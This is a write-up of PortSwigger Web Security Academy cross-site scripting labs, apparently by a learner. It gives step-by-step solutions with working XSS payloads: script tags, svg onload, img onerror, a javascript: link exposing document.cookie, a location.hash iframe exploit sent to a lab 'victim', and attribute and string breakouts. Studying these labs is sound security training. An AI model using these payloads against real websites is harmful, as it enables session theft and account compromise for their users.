<img src="images/image1.png" alt="third" width="500">

To solve this lab we type

`<script>alert('hello world')</script>`

 in the search bar

<img src="images/image2.png" alt="third" width="500">

<img src="images/image3.png" alt="third" width="500">
**Step1**

Click on view post

<img src="images/image4.png" alt="third" width="500">

**Step2**

Leave a  alert script as a comment

<img src="images/image5.png" alt="third" width="500">

Post the comment

And lab will be solve.

Now when we again view the same post it show alert message.

<img src="images/image6.png" alt="third" width="500">

<img src="images/image7.png" alt="third" width="500">

**Step1**

First we see what is document.write

The document.write() method writes a string of text to a document stream opened by document.open()

**Example**
```
    <script>  
               functionnewContent(){

                         document.open();

                         document.write("<h1>Out with the old, in with the new!</h1>");

                         document.close();

                   }

     </script>
```
Then we see what is location.search

The search property of the Location interface is a search string, also called a query string; that is, a string containing a '?' followed by the parameters of the URL.

**Code Example**

`.html code`

`<a id="myAnchor" href="/en-US/docs/Location.search?q=123">Link</a>`

Corresponding `.js `code
```
const anchor = document.getElementById("myAnchor");

const queryString = anchor.search; // Returns:'?q=123'

// Further parsing:

const params = new URLSearchParams(queryString);

const q = parseInt(params.get("q")); // is the number 123
```

Now we try to use this knowledge to solve this lab

Now
```
<script>  
letuserInput = "<svg onload=alert(1)>";  
document.write(userInput);  
</script>
```

<img src="images/image8.png" alt="third" width="500">

And lab will solve


**Or alternative**

`"><svg onload=alert(1)>`

<img src="images/image9.png" alt="third" width="500">

**Step 1**

Write any text in search bar

In developer we can see problem is in inner HTML

<img src="images/image10.png" alt="third" width="500">

**Step2:**

Now we try to use this exploit that show alert on error.

`<img src=1 href=1 onerror="javascript:alert(1)"></img>`

There are a lot of exploits available on this repositories

[https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)

As we are triggering an error message so these exploit also work
```
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>  
<video src=1 href=1 onerror="javascript:alert(1)"></video>  
<image src=1 href=1 onerror="javascript:alert(1)"></image>

<img src=1 onerror=alert(1)>
```

<img src="images/image11.png" alt="third" width="500">

**Step1**

We go to feedback page we see in url

<img src="images/image12.png" alt="third" width="500">

So it is taking a returnpath

**Step2:** 

first we inspect page

<img src="images/image13.png" alt="third" width="500">

from this it is very clear that the script set the href attribute that is paste in URL.

Like

`<a id=""backlink" href="/userinput">Back</a>`

**Step3:**

So we use

`<a id=""backlink" href="javascript:alert(document.cookie)">Back</a>`

For this we remove / and type

`javascript:alert(document.cookie)`

<img src="images/image14.png" alt="third" width="500">

Now click enter and press back button inline with submit button

<img src="images/image15.png" alt="third" width="500">

Point:The syntax `javascript:function()` is typically used when creating and executing a JavaScript function directly from the browser's address bar or from a JavaScript-enabled environment where you can execute JavaScript code directly.

<img src="images/image16.png" alt="third" width="500">

**Step1:**

First we view page source code

<img src="images/image17.png" alt="third" width="500">

Here we have a javascript code that show to move to next post based on heading of post.

**Step2:**

Now we check is it working or not. For this we use

We have h2 heading "Awkward Breakups"

#h2 in URL.

Because this script will remove # from start.

<img src="images/image18.png" alt="third" width="500">

And its working

**Step3:**  

Now we go to console and check the result

Press `ctrl+shift+c` and type command `window.location.hash.slice(1)`

<img src="images/image19.png" alt="third" width="500">

From the result this is clear that the hash sign is remove and then URL encoded

<img src="images/image20.png" alt="third" width="500">

Then the input is decoded

**Step4:**

After searching on internet I come to this link

[https://security.stackexchange.com/questions/177261/is-xss-possible-with-jquerylocation-hash](https://security.stackexchange.com/questions/177261/is-xss-possible-with-jquerylocation-hash)

Here I found this information

<img src="images/image21.png" alt="third" width="500">

`#p=<img src%3D/%20onerror%3Dalert(1)>`

When I try this payload it show alert

<img src="images/image22.png" alt="third" width="500">

So now we try to print

`#p=<img src%3D/%20onerror%3Dprint(1)>`

And its working

<img src="images/image22.png" alt="third" width="500">

**Step5**

Now we send this to victim

`<iframe src="https://0a43000f0447eac082472953006500a0.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

And deliver it to victim

<img src="images/image23.png" alt="third" width="500">

**Step1:**

To solve this first we try with simple payload and see result

When we try to close tag using ">

<img src="images/image24.png" alt="third" width="500">

Its not working because it is reading ">  as string

**Step2:**

Now we try this payload

As we see source code is

<img src="images/image25.png" alt="third" width="500">

To make it complete look

	`<input type="text" value=""><script>alert(document.domain)</script>" autofocus onfocus=alert('XSS') x="">`

So our payload look like

`"><script>alert(document.domain)</script>" autofocus onfocus=alert('XSS') x="">`

<img src="images/image26.png" alt="third" width="500">

And the lab will solve


**Step3:**

This lab can also solve using

Replace your input with the following payload to escape the quoted attribute and inject an event handler:  
`"onmouseover="alert(1)`

<img src="images/image27.png" alt="third" width="500">

**Step1**

First we write a comment in any post

<img src="images/image28.png" alt="third" width="500">

And intercept the request in burp proxy

<img src="images/image29.png" alt="third" width="500">

**Step2:**

Send the request to repeater and make change the websitename to

<img src="images/image30.png" alt="third" width="500">

**Step3**

- Send it

- Follow redirection

<img src="images/image32.png" alt="third" width="500">

**Step4:**

Now when we go to comment and click on a post it show alert message

<img src="images/image33.png" alt="third" width="500">

<img src="images/image34.png" alt="third" width="500">

**Step1:**

First we view page source

<img src="images/image35.png" alt="third" width="500">

**Step2:**

After viewing the source code

We try this exploit

`'; alert(1); //`

Or we use

`'-alert(1)-'`

<img src="images/image36.png" alt="third" width="500">
